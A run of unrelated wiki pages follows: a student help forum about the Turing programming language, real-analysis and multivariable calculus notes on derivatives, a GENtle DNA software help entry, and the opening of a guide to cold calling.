== how do you skip lines ==


is there any way you could skip a line under a certain condition

Example

if x=2 &quot;now i need the computer to avoid the data from line 32 to 45&quot;

:In most cases, you can just store it to a temporary variable in those lines:
&lt;pre&gt;
var tmp : string
if x=2 then
     for i : 1 .. 14
          get : inp, tmp
     end for
end if
&lt;/pre&gt;

:However, I've had cases where you can't store it to a variable at all, and I'm not sure how to get around that.  If you find out how, please post it here! :) -[[User:Frazzydee|Frazzydee]]|[[User talk:Frazzydee|&amp;#9997;]] 02:48, 9 Jun 2005 (UTC)

== GOLF SIMULATION ASSIGNMENT ==

I am in grade 10, and we were just asked to make a simulation program. With variables such as wind, gravity, etc. Anyways, I've been sick for the past week or so and haven't got anything done because I dont have turing at my home. Can anyone send me a program which will simulate a golf shot? It has to have variables such as wind gravity slice and hook of the shot, and the user can enter thigns such as if he /she is a amteur or pro golfer, therefore affecting how close their shot will be to the hole. Can anyone PLEASE send me a prgram that will do this. I am in HUGE need. THANKS! my email is jamias_666@hotmail.com if u want to send me one. thank you!
  I advice you not to publish email addresses if you don't want to get spam.

== Making A RPG Game In Turing ==

Is it possible to make a RPG in turing? I can make a very basic battle system with hp and such. However I  want to make it so you can level up and use items and all that. With a weapon making system of some kind.
----
Turing is an extrmely limited programming tool/language, making an RPG with level ups and wepons would be extremely difficult if not impossible. This is because Turing is used mainly as a ''learning tool'' for beginner programmers to show them the basic elements of programming, a better programmming language to use would be Java maybe, or C++, I really '''do not''' recommendd the use of Turing to create a complex game such as the one you describe
----
i have made a simple(it has levels atk ect.)text based rpg but it is hard to make graphics in my game so instead i wnt for a retro look if you like doing these kind of things you should go to this website.

== connect four ==

i need help writing a program for a video connect four game. i just had pneumonia and have missed 2 weeks or so of school. this project is due very soon and i'm not very good at turing. if somebody could please, please, please help me, that would be greatly appreciated. Thank you so much.


----
Of course you can make an RPG in Turing. Now, it won't be the graphical equal to Final Fantasy X, but you can make something that looks like a game from the Nintendo/Super Nintendo era without much trouble at all.

: := sets the value of a variable.  You should be using = for comparison (eg. comparing the value of label to &quot;a&quot;).  Try that, and come back if it still doesn't work...sorry, but I don't have time to test it myself right now :( -[[User:Frazzydee|Frazzydee]]|[[User talk:Frazzydee|&amp;#9997;]] 22:58, 26 February 2006 (UTC)

== A chat program, with a GUI ==

I've got 95% of the code complete.  I'm stumped at the actual transfer of information though!  I can open a connection, and connect, but I have no way of passing information between the server and the client!  Can someone help?

:You should be able to use get and put, IIRC.  Is there any reason why &quot;get : ns, stringvar&quot; won't work? (where ns is your netstream and stringvar is a string variable).  If you're still having trouble, post your code somewhere and I'll take a look at it. -[[User:Frazzydee|Frazzydee]]|[[User talk:Frazzydee|&amp;#9997;]] 23:00, 26 February 2006 (UTC)

umm yee i jus wanted to know like i understand the how the loops work but i dont understand how you get the program to loop so that it starts over again if the user prompts it to like for example.. in the case such as you hav the program run then you get to the end and you loop it so it says exit program if word = no( the user says no i dont want to play again) but how do you get it to start over if the user says yes they do want to start over again ??

== Linking ==

I'm working on a turing project for school (grade 10 FTW), and I have to create a welcome screen to use in all of my programs. The problem is, I made a really nice one (atleast nice for what we've learned so far) but the code it really long. I don't want to have to copy that into the top of my program everytime. Is there a line of code that I can put into the top of each program to tell it to run the welcome screen first, then continue on to the rest of the program?

You can use include.

For example, if your welcome screen is in a file called welcome.t, you would write

include &quot;welcome.t&quot;

at the beginning of each of your assignments.

Make sure welcome.t is in the same directory as your assignment, though.

== Too many Variables. ==

I am trying to make a Sudoku game, which has turned out to be a long script.

Hello, while I won't tudor you, you may find it helpful to look up arrays in the turing reference. 


var sampleArray1: array 1..9,1..9 of int    %Creates an array

var sampleArray2: array 1..3,1..6 of int:   %Creates an array and assigns puts values into the array 
    =init(1,1,1,1,1,1,
    1,1,1,1,1,1,
    2,2,2,5,6,2)
sampleArray1(1,3):=6    %Assigns the integer 6 to index 1,3 of the array

:You are not using boolean properly. Rewrite (p1 = &quot;p&quot; or &quot;P&quot;) to (p1 = &quot;p&quot; or '''p1 = &quot;P&quot;'''), so the first line would be:

== parallel port ==

How do use the parallelget function. according to my understanding its more complicated than ''parallelget(64)'' . please answer in full detail as i am in g.12. what is'''Bold text''' MOD and DIV. thanks . ALOT.
parallelget is a function with no parameters:

&lt;pre&gt;
procedure PGet(var val, i0, i1, i2, i3, i4: int)
val := parallelget
i0 := (val div 64) mod 2
i1 := (val div 128) mod 2
i2 := (val div 32) mod 2 
i3 := (val div 16) mod 2
i4 := (val div 8) mod 2 
end PGet
&lt;/pre&gt;


parallelget represents an already determined number, it requires no variables and that is wht parallelget(64) doesnt do anything. use it like a variable, ex. &quot;put parallelget&quot;

== programming alphabetically ==

yeah, i need to make a program where i ask the user for two words, and then i put it in alphabetical order
i have managed to do this by just making my variables word1, and word2, then i just put :

&lt;pre&gt;
if word1 &gt; word2 then
   put word2,&quot;&quot;:2,word1
else
   put word1,&quot;&quot;:2, word2
end if
&lt;/pre&gt;

in my program i did include the get statements and the variables... but i just put in the general idea i had for putting things alphabetically. The problem is, both words have to be either upper case, or lower case, i cant word1 as upper, and word2 as lower because lower case words are larger than upper even if the upper starts with &quot;Z&quot; and the lower starts with &quot;a&quot;, my program will still display after the words are inputted, Z is before a. how do i make it so it says a before Z?

== Base converter (base 2, 8, 10, 16 conversions) ==

hi!

i was wondering if i could get some help in converting numbers

i need to convert decimal, hexadecimal, binary and octal into eachother

i know that

&lt;pre&gt;
binary_out := intstr (decimal_in, 0, 2)
&lt;/pre&gt;

will change decimal_in to binary_out

and
&lt;pre&gt;
for decreasing n : length (binin) .. 1
        if binin (n) = '1' then
            decout := decout + 2 ** (length (binin) - n)
        end if
    end for
&lt;/pre&gt;
will change the number back to decimal

i am having difficulty with : binary to octal/hex, octal to decimal/binary/hex, and hex to decimal/binary/octal

please help me! thanks
==&gt; why not just convert binary string back to integer (base 10) first?  Then you can use &quot;intStr(int, 0, &lt;base&gt;) to convert to Hex or Octal string?
&lt;pre&gt;
decNumberOut := strint(binStringIn, 2)
octalString  := intstr(decNumberOut, 0, 8)
hexString    := intstr(decNumberOut, 0, 16)
&lt;/pre&gt;

== calculating tax for output ==

can anyone tell me how to make my program calculate tax? I already tried to multiply it by a number on the line itself, but my instructor does not allow it, saying it needs to be done as a variable, where after the price is inputed, you click and it calculates the tax. 

Here is the program so far 



var Name:string
var Price:int
var Total:int

put &quot;What is the item you want to buy?&quot;
get Name:* 
put &quot;How much does it cost?&quot;
get Price
put &quot;With tax, the total bill is..&quot;


well it depends how much the tax is in your area, since i don't what it is in your area, I will prompt the user to input it  just like they input the price. Below is the new program:
&lt;pre&gt;
var Name:string
var Price:int
var Total:int
var Tax : int

put &quot;What is the item you want to buy?&quot;
get Name:* 
put &quot;How much does it cost?&quot;
get Price
put &quot;How much is the tax.&quot;
get Tax 
put &quot;With tax, the total bill is..&quot;
Total := (Price * Tax) + Price
put Total
&lt;/pre&gt;
Thats it!, hope it helped

I am a grade 10 student who attends a &quot;Computer Engineering&quot; class. We have been doing Turing for a while now and we have been assigned a final project worth 30 percent of our marks. The assignment I was given is this:

You have been hired by the grade 10 Computer Science teacher to help students learn new computer terms by creating a Hangman game with the appropriate graphics. As a student enters a letter they think is in the word either a green LED light will light indicating the letter is correct or a red LED will light indicating the letter is wrong.

Peripheral: You must design and build a peripheral which will display 2 LEDs associated with attractively made designs for being correct (green) or wrong (red)

Interface: You must properly assemble a parallel port connector with 2 LEDs and insert them into the peripheral.

Now, I have created my hangman game on Turing with all of the game requirements, except for the peripheral and interface. Our teacher has not covered any of that information; therefore I don’t know how to do it.

Please, if you can explain to me or give me steps to what I should do (even a link to where I can get answers) will be very useful and very well appreciated.
Thank you!

hello i am in grade 10. I tried my best to do this but i cant we are doing some practice on chapter 6 of turing and we have to creat a quiz where it ask's for like multiple choice questions,true and false and matching.This quiz consist of 10 questions. After each question the computer must chech if the answer is correct or incorrect, and output the result as well as the number of marks earned for that question.  At the end of the test, the computer must print out the final mark for the test in 3 ways:
example:
1.A fraction
2.A percentage
3. A letter grade
If the test was a 50 percent or lower, the computer must ask if the student would like to re-write the test.  If she/he wants to, the computer must loop back to the 1st question and begin again with a blank mark.  The student can rewrite a total of 2 times
Here are the 10 questions i want to put in order to make the turing program work
Multiple choice question

1:What is another name for CPU
Here are the options of the answer
1:Microprocessor
put &quot; Yes your right&quot;
2:decode
put &quot;No try again&quot;
3:execute
put&quot;No you're wrong&quot;
4:Microchip
put &quot;Nope this is wrong sorry&quot;
So these questions i want to put into turing form
 


One question for true and false
1:Turing is a great programming language
if the statement is true then put its right
if the statement is false but its wrong

and other questions like this
Please i really need help so please tell me ASAP

== How do you find the highest and lowest number from a list of numbers given  in Turing (programming)? ==

Here is the question: 
Prompt the user to input test marks. Find the average and highest and lowest marks. 

The average was easy to find but I have on idea how to get the highest and lowest marks. Our (Gr. 10) Turing class so far has covered loops, for loops, if statements, variable types: string, real, int, and other basic things. 

Anyone have any idea how to solve this, please? Thanks.</text>

==Definition==
We are now ready to define the derivative of a function 

Let &lt;math&gt;f:\mathbb{R}\to\mathbb{R}&lt;/math&gt;

Let &lt;math&gt;a\in\mathbb{R}&lt;/math&gt; 

We say that ''&amp;fnof;''(''x'') is '''differentiable''' at ''x''=''a'' if and only if there exists a real number ''L'' such that 

&lt;math&gt;\lim_{x \rightarrow a} {f(x)-f(a) \over x-a}=L&lt;/math&gt;.

''L'' is said to be the '''derivative''' of ''&amp;fnof;'' at ''a'' and is denoted by &lt;math&gt;f'(a)&lt;/math&gt;

A function is said to be differentiable on a set ''A'' if the derivative exists for each ''a'' in ''A''. A function is differentiable if it is differentiable on its entire domain.

Conceptually, finding the derivative means finding the slope of the tangent line to the function.  Thus the derivative can be thought of as a linear, or first-order, approximation of the function.

==Properties==

Some properties of the derivative follow immediately from the definition:

===Basic Properties===
If f and g are differentiable, then:


*&lt;big&gt;&lt;math&gt; (f+g)'(x) =  f'(x) + g'(x)&lt;/math&gt;&lt;/big&gt;

*&lt;big&gt;&lt;math&gt; (\lambda f)'(x) = \lambda f'(x) &lt;/math&gt;&lt;/big&gt;

====Proof====

* &lt;math&gt;(f+g)'(x) = \lim_{y \rightarrow x} {(f(y)+ g(y))-(f(x)+g(x)) \over y-x} &lt;/math&gt;

&lt;math&gt;= \lim_{y \rightarrow x} \left ( {f(y) - f(x) \over y-x} + {g(y) - g(x) \over y-x} \right )&lt;/math&gt;

&lt;math&gt; = \lim_{y \rightarrow x} {f(y) - f(x) \over y-x} + \lim_{y \rightarrow x} {g(y) - g(x) \over y-x} = f'(x) + g'(x)&lt;/math&gt;


* &lt;math&gt; ( \lambda f)'(x) = \lim_{y \rightarrow x} { \lambda f(y) - \lambda f(x) \over y-x} = \lambda \lim_{y \rightarrow x} {f(y) - f(x) \over y-x} = \lambda f'(x)&lt;/math&gt;

===Theorem(Differentiability Implies Continuity)===
If f is differentiable at x, it is continuous at x
====Proof====

Since f is differentiable at x, &lt;math&gt;\lim_{y \rightarrow x} {f(y)-f(x) \over y-x} = f'(x)&lt;/math&gt;.

So &lt;math&gt;\lim_{y \rightarrow x} \left[ f(y)-f(x) \right] = \lim_{y \rightarrow x} {f(y)-f(x) \over y-x} \lim_{y \rightarrow x} \left( y-x \right) = f'(x) \; 0 = 0&lt;/math&gt;

Thus &lt;math&gt;\lim_{y \rightarrow x} f(y) = f(x)&lt;/math&gt;, so f is continuous at x.

===Theorem(Product Rule)===
If f and g are differentiable, then &lt;math&gt; (fg)'(x) = f'(x)g(x) + f(x)g'(x)&lt;/math&gt;
====Proof====
&lt;math&gt; (fg)'(x) = \lim_{y \rightarrow x} {f(y)g(y)-f(x)g(x) \over y-x} &lt;/math&gt; &lt;math&gt;= \lim_{y \rightarrow x} {f(y)g(y)-f(x)g(y)+f(x)g(y)-f(x)g(x) \over y-x}&lt;/math&gt;

&lt;math&gt; = \lim_{y \rightarrow x} ({f(y)-f(x))g(y)+f(x)(g(y)-g(x)) \over y-x} &lt;/math&gt; 

&lt;math&gt;= \lim_{y \rightarrow x} {f(y)-f(x) \over y-x}\lim_{y \rightarrow x} g(y) + f(x) \lim_{y \rightarrow x} {g(y)-g(x) \over y-x} &lt;/math&gt;&lt;math&gt; = f'(x)g(x) + f(x)g'(x)&lt;/math&gt;, since g is continuous at x.&lt;math&gt;\Box&lt;/math&gt;


The following theorem is a bit trickier to prove than it seems. We would like to use the following argument:


&lt;math&gt;(f \circ g)'(x) = \lim_{y \rightarrow x} {f(g(y))-f(g(x)) \over y-x}&lt;/math&gt; &lt;math&gt;= \lim_{y \rightarrow x} {f(g(y))-f(g(x)) \over g(y)-g(x)}{g(y)-g(x) \over y-x}&lt;/math&gt;&lt;math&gt; = \lim_{y \rightarrow x} {f(g(y))-f(g(x)) \over g(y)-g(x)}\lim_{y \rightarrow x}{g(y)-g(x) \over y-x}&lt;/math&gt;&lt;math&gt; = f'(g(x))g'(x)&lt;/math&gt;


The problem is that &lt;math&gt;g(y) - g(x)&lt;/math&gt; may be zero at points arbitrarily close to x, and therefore &lt;math&gt;{f(g(y))-f(g(x)) \over g(y)-g(x)}&lt;/math&gt; would not be continuous at these points.  Thus we apply a clever lemma as follows:

===Theorem (Caratheodory's Lemma)===
Let &lt;math&gt;f:\mathbb{R}\to\mathbb{R}&lt;/math&gt;

We say that &lt;math&gt;f(x)&lt;/math&gt; is differentiable at &lt;math&gt;x=c&lt;/math&gt; if and only if there exists a continuous function &lt;math&gt;\phi :\mathbb{R}\to\mathbb{R}&lt;/math&gt; that satisfies

&lt;math&gt;(x-c)\phi (x)=f(x)-f(c)\forall x\in\mathbb{R}&lt;/math&gt;
====Proof====
(&lt;math&gt;\Rightarrow&lt;/math&gt;)Let &lt;math&gt;f(x)&lt;/math&gt; be differentiable at &lt;math&gt;x=c&lt;/math&gt; and define function &lt;math&gt;\phi :\mathbb{R}\to\mathbb{R}&lt;/math&gt; such that

&lt;math&gt;\phi (x)=\frac{f(x)-f(c)}{x-c}&lt;/math&gt; for &lt;math&gt;x\neq c&lt;/math&gt; and 

&lt;math&gt;\phi (c)=f'(c)&lt;/math&gt;

It is easy to see that &lt;math&gt;\phi (x)&lt;/math&gt; is continuous and that it satisfies the required condition.

(&lt;math&gt;\Leftarrow&lt;/math&gt;)
Let &lt;math&gt;\phi (x)&lt;/math&gt; be a continuous function satisfying &lt;math&gt;(x-c)\phi (x)=f(x)-f(c)\forall x\in\mathbb{R}&lt;/math&gt;

For all &lt;math&gt;x\neq c&lt;/math&gt;, we have that &lt;math&gt;\phi (x)=\tfrac{f(x)-f(c)}{x-c}&lt;/math&gt;

As &lt;math&gt;\phi&lt;/math&gt; is continuous, &lt;math&gt;\phi (c)=\lim_{x\to c}\phi (x)&lt;/math&gt;, that is,

&lt;math&gt;\phi (c)=\lim_{x\to c}\frac{f(x)-f(c)}{x-c}&lt;/math&gt; which implies that &lt;math&gt;f(x)&lt;/math&gt; is differentiable at &lt;math&gt;x=c&lt;/math&gt;

===Theorem(Chain Rule)===
Let &lt;math&gt;g:\mathbb{R}\to\mathbb{R}&lt;/math&gt; be differentiable at &lt;math&gt;c\in\mathbb{R}&lt;/math&gt;

Let &lt;math&gt;f:\mathbb{R}\to\mathbb{R}&lt;/math&gt; be differentiable at &lt;math&gt;d=g(c)&lt;/math&gt;

Then&lt;br /&gt; (i)&lt;math&gt;(f\circ g)(x)&lt;/math&gt; is differentiable at &lt;math&gt;x=c&lt;/math&gt;

(ii)&lt;math&gt;(f\circ g)'(c)=f'(g(c))g'(c)&lt;/math&gt;
====Proof====
Caratheodory's Lemma implies that there exist continuous functions &lt;math&gt;\phi ,\gamma :\mathbb{R}\to\mathbb{R}&lt;/math&gt; such that &lt;math&gt;(x-c)\gamma (x)=g(x)-g(c)&lt;/math&gt; and &lt;math&gt;(g(x)-g(c))\phi (x)=f(g(x))-f(g(c))&lt;/math&gt; 

Now, consider the function &lt;math&gt;\eta (x)=\phi (x)\gamma (x)&lt;/math&gt;. Obviously, &lt;math&gt;\eta (x)&lt;/math&gt; is continuous. 

Also, it satisfies &lt;math&gt;(x-c)\eta (x)=(f\circ g)(x)-(f\circ g)(c)&lt;/math&gt;. Hence, by Caratheodory's Lemma, &lt;math&gt;(f\circ g)(x)&lt;/math&gt; is differentiable at &lt;math&gt;x=c&lt;/math&gt; and that &lt;math&gt;(f\circ g)'(c)=\eta (c)=f'(g(c))g'(c)&lt;/math&gt;


==Examples==
Consider &lt;math&gt; f: \mathbb{R} \rightarrow \mathbb{R} &lt;/math&gt; by &lt;math&gt; f(x) = x &lt;/math&gt;.  What is the derivative of &lt;math&gt; f &lt;/math&gt; at &lt;math&gt; a &lt;/math&gt;?

&lt;math&gt;  
f'(a) = \lim_{h \rightarrow 0} \frac{f(a+h) -f(a)}{h} = \lim_{h \rightarrow 0} \frac{a+h - a}{h} = \lim_{h \rightarrow 0} \frac{h}{h} = \lim_{h \rightarrow 0} 1 = 1
&lt;/math&gt;

So, here we see that &lt;math&gt; f'(a) =1 &lt;/math&gt;. Since &lt;math&gt; a &lt;/math&gt; was an arbtarily choosen point we conculde that &lt;math&gt; f'(a) = 1&lt;/math&gt; &lt;math&gt; \forall a \in \mathbb{R} &lt;/math&gt; 

Similar derivative formula's may also be found.

==Exercises==

*Some of the most popular counter examples to illustrate properties of continuity and differentiability are functions involving &lt;math&gt;f(x)=\sin ( \tfrac{1}{x} )&lt;/math&gt;&lt;br /&gt;&lt;br /&gt;(i)Prove that &lt;math&gt;f(x)=\sin ( \tfrac{1}{x} )\forall x\neq 0, f(0)=0&lt;/math&gt; is not continuous at &lt;math&gt;x=0&lt;/math&gt;&lt;br /&gt;&lt;br /&gt;(ii)Prove that the function &lt;math&gt;f(x)=x\sin (\tfrac{1}{x} )\forall x\neq 0, f(0)=0&lt;/math&gt; is continuous but not differentiable at &lt;math&gt;x=0&lt;/math&gt;&lt;br /&gt;&lt;br /&gt;(iii)Prove that &lt;math&gt;f(x)=x^2 \sin( \tfrac{1}{x} )\forall x\neq 0, f(0)=0&lt;/math&gt; is differentiable at &lt;math&gt;x=0&lt;/math&gt;</text>

We will first revise some important concepts of Linear Algebra that are of importance in Multivariate Analysis. The reader with no background in Linear Algebra is advised to refer the book [[Linear Algebra]]. 

==Vector Space==
A set &lt;math&gt;\mathcal{V}&lt;/math&gt; is said to be a '''Vector Space''' over a field &lt;math&gt;F&lt;/math&gt; if and only if operations ''addition'' and ''scalar multiplication'' are defined over it so as to satisfy for all &lt;math&gt;\mathbf{v_1}, \mathbf{v_2},\ldots\in\mathcal{V}&lt;/math&gt; and &lt;math&gt;c_1,c_2\in F&lt;/math&gt;&lt;br /&gt;

(i)''Commutativity'':&lt;math&gt;\mathbf{v_1}+\mathbf{v_2}=\mathbf{v_2}+\mathbf{v_1}&lt;/math&gt;&lt;br /&gt;

(ii)''Associativity'':&lt;math&gt;(\mathbf{v_1}+\mathbf{v_2})+\mathbf{v_3}=\mathbf{v_1}+(\mathbf{v_2}+\mathbf{v_3})&lt;/math&gt;&lt;br /&gt;

(iii)''Identity'':There exists &lt;math&gt;\mathbf{0}\in\mathcal{V}&lt;/math&gt; such that &lt;math&gt;\mathbf{v_1}+\mathbf{0}=\mathbf{v_1}=\mathbf{0}+\mathbf{v_1}&lt;/math&gt;&lt;br /&gt;

(iv)''Inverse'':There exists &lt;math&gt;-\mathbf{v_1}\in\mathcal{V}&lt;/math&gt; such that &lt;math&gt;\mathbf{v_1}+(-\mathbf{v_1})=\mathbf{0}&lt;/math&gt;&lt;br /&gt;

(v):&lt;math&gt;c\mathbf{v_1}+c\mathbf{v_2}=c(\mathbf{v_1}+\mathbf{v_2})&lt;/math&gt;&lt;br /&gt;

(vi)&lt;math&gt;c_1\mathbf{v}+c_2\mathbf{v}=(c_1+c_2)\mathbf{v}&lt;/math&gt;&lt;br /&gt;

(vii)&lt;math&gt;c_1(c_2\mathbf{v_1})=c_2(c_1\mathbf{v_1})=(c_1c_2)\mathbf{v_1}&lt;/math&gt;&lt;br /&gt;

Members of a vector space are called &quot;Vectors&quot; and those of the field are called &quot;Scalars&quot;. &lt;math&gt;\mathbb{R}^n&lt;/math&gt;, the set of all polynomials etc. are examples of vector spaces

A set of linearly independant vectors that spans the vector space is said to be a '''Basis''' for the vector space.

==Linear Transformations==
Let &lt;math&gt;X,Y&lt;/math&gt; be vector spaces.

Let &lt;math&gt;T:X\to Y&lt;/math&gt;

We say that &lt;math&gt;T&lt;/math&gt; is a '''Linear transformation''' if and only if for all &lt;math&gt;\mathbf{v_1},\mathbf{v_2}\in X&lt;/math&gt;,

(i)&lt;math&gt;T(\mathbf{v_1}+\mathbf{v_2})=T(\mathbf{v_1})+T(\mathbf{v_2})&lt;/math&gt;&lt;br /&gt;

(ii)&lt;math&gt;T(c\mathbf{v_1})=cT(\mathbf{v_1})&lt;/math&gt;


As we will see, there are two major ways to define a 'derivative' of a multivariable function. We first present the seemingly more straightforward way of using &quot;Partial Derivatives&quot;.

==Directional and Partial Derivatives==
Let &lt;math&gt;\mathbf{f}:\mathbb{R}^n\to \mathbb{R}^m&lt;/math&gt;

Let &lt;math&gt;\mathbf{a},\mathbf{y}\in \mathbb{R}^n&lt;/math&gt;

We say that &lt;math&gt;\mathbf{f}&lt;/math&gt; is differentiable at &lt;math&gt;\mathbf{a}\in\mathbb{R}^n&lt;/math&gt; with respect to vector &lt;math&gt;\mathbf{y}&lt;/math&gt; if and only if there exists &lt;math&gt;\mathbf{L}\in\mathbb{R}^m&lt;/math&gt; that satisfies

&lt;math&gt;\lim_{h\to 0}\frac{\mathbf{f}(\mathbf{a}+h\mathbf{y})-\mathbf{f}(\mathbf{a})}{h}=\mathbf{L}&lt;/math&gt;

&lt;math&gt;\mathbf{L}&lt;/math&gt; is said to be the derivative of &lt;math&gt;\mathbf{f}&lt;/math&gt; at &lt;math&gt;\mathbf{a}&lt;/math&gt; with respect to &lt;math&gt;\mathbf{y}&lt;/math&gt; and is written as &lt;math&gt;\mathbf{f}'(\mathbf{a};\mathbf{y})&lt;/math&gt;

When &lt;math&gt;\mathbf{y}&lt;/math&gt; is a unit vector, the derivative is said to be a partial derivative. Here we will explicitly define partial derivatives and see some of their properties. 


Let &lt;math&gt;f&lt;/math&gt; be a real multivariate function defined on an open subset &lt;math&gt;\Omega&lt;/math&gt; of 
&lt;math&gt; \mathbb{R}^{n} &lt;/math&gt; 
:&lt;math&gt; f: \Omega \longrightarrow \mathbb{R} &lt;/math&gt;.

Then the ''partial derivative'' at some parameter &lt;math&gt; (x_1,...,x_n) &lt;/math&gt; with respect to the ''coordinate'' &lt;math&gt;x_i&lt;/math&gt; is defined as the following limit
:&lt;math&gt; \lim_{h \rightarrow 0} {f(x_1,\ldots,x_i+h,\ldots,x_n)-f(x_1,\ldots,x_i,\ldots,x_n) \over h} = { \partial f \over \partial x_i } &lt;/math&gt;.

&lt;math&gt;f&lt;/math&gt; is said to be ''differentiable'' at this parameter &lt;math&gt; (x_1,...,x_n) &lt;/math&gt; if
the difference &lt;math&gt; f(x_1,...,x_i+h,...,x_n)-f(x_1,...,x_i,...,x_n) &lt;/math&gt; is 
equivalent up to first order in ''h'' to a linear form ''L'' (of h), that is
:&lt;math&gt; f(x_1,...,x_i+h,...,x_n)-f(x_1,...,x_i,...,x_n) = L\times h + o(\|h\|).&lt;/math&gt;

The linear form ''L'' is then said to be the ''differential'' of &lt;math&gt;f&lt;/math&gt; at &lt;math&gt;(x_1,...,x_n) &lt;/math&gt;, and is written as &lt;math&gt; Df|_{(x_1,\ldots,x_n)} &lt;/math&gt; or sometimes 
&lt;math&gt; \mathrm{d}f(x_1,\ldots,x_n) &lt;/math&gt;.

In this case, where &lt;math&gt;f&lt;/math&gt; is differentiable at &lt;math&gt;(x_1,\ldots,x_n) &lt;/math&gt;,
by linearity we can write
:&lt;math&gt; \mathrm{d}f={\partial f \over \partial x_1}\mathrm{d} x_1+\ldots+
                                    {\partial f \over \partial x_n}\mathrm{d} x_n&lt;/math&gt;

&lt;math&gt;f&lt;/math&gt; is said to be ''continuously differentiable'' if its differential is defined at any 
parameter in its domain, and if the differential is varying continuously relative
to the parameter &lt;math&gt; (x_1,...,x_n) &lt;/math&gt;, that is if it coordinates (as a 
linear form) &lt;math&gt; \partial f \over \partial x_1 &lt;/math&gt; are varying continuously.

In case partial derivatives exists but &lt;math&gt;f&lt;/math&gt; is not differentiable, and sometimes
not even continuous ''exempli gratia''
:&lt;math&gt; f:(x,y)\mapsto {(xy)^2\over (x^2+y^2)}&lt;/math&gt;
(and &lt;math&gt; f(0,0)=0 &lt;/math&gt;) we say that &lt;math&gt;f&lt;/math&gt; is ''separably differentiable''.

==Total Derivatives==
The total derivative is important as it preserves some of the key properties of the single variable derivative, most notably the assertion differentiability implies continuity

Let &lt;math&gt;f:A\subseteq\mathbb{R}^n\to \mathbb{R}^m&lt;/math&gt;

We say that &lt;math&gt;f&lt;/math&gt; is differentiable at &lt;math&gt;\mathbf{a}\in A&lt;/math&gt; if and only if there exists a &lt;u&gt;linear transformation&lt;/u&gt;, &lt;math&gt;\mathbf{D} f(\mathbf{a}):\mathbb{R}^n\to \mathbb{R}^m&lt;/math&gt;, called the ''derivative'' or ''total derivative'' of &lt;math&gt;f&lt;/math&gt; at &lt;math&gt;\mathbf{a}&lt;/math&gt;,  such that 

&lt;math&gt;\lim_{\| \mathbf{h} \| \to 0}\frac{\| f(\mathbf{a}+\mathbf{h})-f(\mathbf{a})-\mathbf{D} f(\mathbf{a})(\mathbf{h}) \|}{\| \mathbf{h} \|}=0&lt;/math&gt;

One should read &lt;math&gt;\mathbf{D} f(\mathbf{a})(\mathbf{h})&lt;/math&gt; as the linear transformation &lt;math&gt;\mathbf{D} f(\mathbf{a})&lt;/math&gt; applied to the vector &lt;math&gt;\mathbf{h}&lt;/math&gt;.  Sometimes it is customary to write this as &lt;math&gt;\mathbf{D} f(\mathbf{a}) \cdot (\mathbf{h})&lt;/math&gt;.


===Theorem===
Suppose &lt;math&gt;A \subseteq \mathbb{R}^n&lt;/math&gt; is an open set and &lt;math&gt;f:A\to \mathbb{R}^m&lt;/math&gt; is differentiable on A.  Think of writing &lt;math&gt;f&lt;/math&gt; in components so &lt;math&gt;f(x_1,\ldots,x_n)=(f_1(x_1,\ldots,x_n),\ldots,f_m(x_1,\ldots,x_n))&lt;/math&gt;. Then the partial derivatives &lt;math&gt;\frac{\partial f_j}{\partial x_i}&lt;/math&gt; exist, and the matrix representing the linear transformation  &lt;math&gt;\mathbf{D} f(\mathbf{x})&lt;/math&gt; with respect to the standard bases of &lt;math&gt;\mathbb{R}^n&lt;/math&gt; and &lt;math&gt;\mathbb{R}^m&lt;/math&gt; is given by the Jacobian Matrix:

&lt;math&gt;\begin{bmatrix} \frac{\partial f_1}{\partial x_1} &amp; \cdots &amp; \frac{\partial f_1}{\partial x_n} \\ \vdots &amp; \ddots &amp; \vdots \\ \frac{\partial f_m}{\partial x_1} &amp; \cdots &amp; \frac{\partial f_m}{\partial x_n}  \end{bmatrix}. &lt;/math&gt;

evaluated at &lt;math&gt;\mathbf{x}=(x_1,\ldots,x_n)&lt;/math&gt;.

NOTE:  This theorem requires the function to be differentiable to begin with.  It is a common mistake to assume that if the partial derivatives exist then this would imply that the function is differentiable because we can construct the Jacobian matrix.  This however is completely false.  Which brings us to the next theorem:

===Theorem===
Suppose &lt;math&gt;A \subseteq \mathbb{R}^n&lt;/math&gt; is an open set and &lt;math&gt;f:A\to \mathbb{R}^m&lt;/math&gt;.  Think of writing &lt;math&gt;f&lt;/math&gt; in components so &lt;math&gt;f(x_1,\ldots,x_n)=(f_1(x_1,\ldots,x_n),\ldots,f_m(x_1,\ldots,x_n))&lt;/math&gt;.  If &lt;math&gt;\frac{\partial f_j}{\partial x_i}&lt;/math&gt; exists  and is continuous on &lt;math&gt;A&lt;/math&gt; for all &lt;math&gt;j\in \{1,\ldots, m \}&lt;/math&gt; and for all &lt;math&gt;i\in \{1,\ldots,n \}&lt;/math&gt;, then &lt;math&gt;f&lt;/math&gt; is differentiable on &lt;math&gt;A&lt;/math&gt;.   


This theorem gives us a nice criteria for a function to be differentiable.</text>

[[image:GENtle_auto_annotate.png|thumb|The automatic annotation dialog.]]
The '''automatic annotation''' feature can search a database of standard vectors (included with the GENtle package), and (optionally) a user-generated database, for feature sequences that are found in the currently opened DNA sequence. Recognized features are then annotated in the current sequence.

Invoked through ''Edit/Auto-annotate sequence'' or &lt;tt&gt;F9&lt;/tt&gt;, a dialog opens, offering various settings:
* Whether or not to search the common vectors database
* Whether or not to use a user-generated database (and, if so, which one)
* Whether or not to reduce the number of generated features (recommended; otherwise, a lot of features are annotated)
* Whether or not to add unrecognized open reading frames as features</text>

      <text xml:space="preserve">== The cold call ==
Cold calls are telephone calls to anyone that you do not know and have not spoken with before. We often make cold calls to try to establish business contacts; to get a job, find a new client, seek someone else’s services, or initiate any other business relationship. Following are some tips on how to make effective cold calls. 


== Planning the call: Establish your objectives &amp; prepare the conversation ==
Plan your call. This requires a conscious effort to sit down, think, and plan out what it is you want to achieve with the call. After you determine your goals, go over them in your mind until they are very clear to you. 

Then, imagine how a conversation might be with the person or business that you plan to call. Rehearse it in your mind and get ready to give a quick and confident presentation of your ideas. Prepare yourself so that you do not stutter or hesitate; you should know exactly what it is you want to say, and be able to say it backwards and forwards. Decide how you want the conversation to flow.

General goals to have for a cold call are to establish contact. You will want the person to remember you the next time you call, and have positive feelings towards you. Plan for the call to be as short as possible and focus on setting up an appointment. All negotiation or in-depth talking should take place later, when you are with the other party in person.

== Just before the call: Prepare your mind and body for a positive attitude ==
